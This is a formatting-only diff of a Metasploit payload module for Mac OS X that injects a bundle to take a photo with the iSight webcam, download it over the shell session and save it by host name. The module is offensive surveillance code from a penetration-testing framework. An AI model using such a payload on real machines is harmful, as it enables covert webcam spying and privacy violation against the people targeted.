@@ -12,34 +12,38 @@ require 'rex/compat'
 #
 ###
 module MetasploitModule
-
   include Msf::Payload::Osx::BundleInject
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'          => 'Mac OS X x86 iSight Photo Capture',
-      'Description'   => 'Inject a Mach-O bundle to capture a photo from the iSight (staged)',
-      'Author'        => 'ddz',
-      'License'       => MSF_LICENSE,
-      'Session'       => Msf::Sessions::CommandShell))
+    super(
+      update_info(
+        info,
+        'Name' => 'Mac OS X x86 iSight Photo Capture',
+        'Description' => 'Inject a Mach-O bundle to capture a photo from the iSight (staged)',
+        'Author' => 'ddz',
+        'License' => MSF_LICENSE,
+        'Session' => Msf::Sessions::CommandShell
+      )
+    )
 
     # Override the BUNDLE path with the iSight capture library
     register_options(
       [
         OptPath.new('BUNDLE',
-          [
-            true,
-            "The local path to the iSight Mach-O Bundle to upload",
-            File.join(Msf::Config.data_directory, "isight.bundle")
-          ]),
+                    [
+                      true,
+                      "The local path to the iSight Mach-O Bundle to upload",
+                      File.join(Msf::Config.data_directory, "isight.bundle")
+                    ]),
         OptBool.new('AUTOVIEW',
-          [
-            true,
-            "Automatically open the picture in a browser ",
-            true
-          ])
-      ])
+                    [
+                      true,
+                      "Automatically open the picture in a browser ",
+                      true
+                    ])
+      ]
+    )
   end
 
   def on_session(session)
@@ -49,11 +53,11 @@ module MetasploitModule
 
     print_status("Downloading photo (#{photo_length} bytes)...")
 
-
     photo = ""
-    while(photo.length < photo_length)
+    while (photo.length < photo_length)
       buff = session.rstream.get_once(-1, 5)
       break if not buff
+
       photo << buff
     end
 
@@ -63,8 +67,7 @@ module MetasploitModule
     # Create a directory for the images
     base = File.join(Msf::Config.config_directory, 'logs', 'isight')
     dest = File.join(base,
-      host + "_" + Time.now.strftime("%Y%m%d.%M%S")+sprintf("%.5d",rand(100000))+".jpg"
-    )
+                     host + "_" + Time.now.strftime("%Y%m%d.%M%S") + sprintf("%.5d", rand(100000)) + ".jpg")
 
     # Create the log directory
     FileUtils.mkdir_p(base)
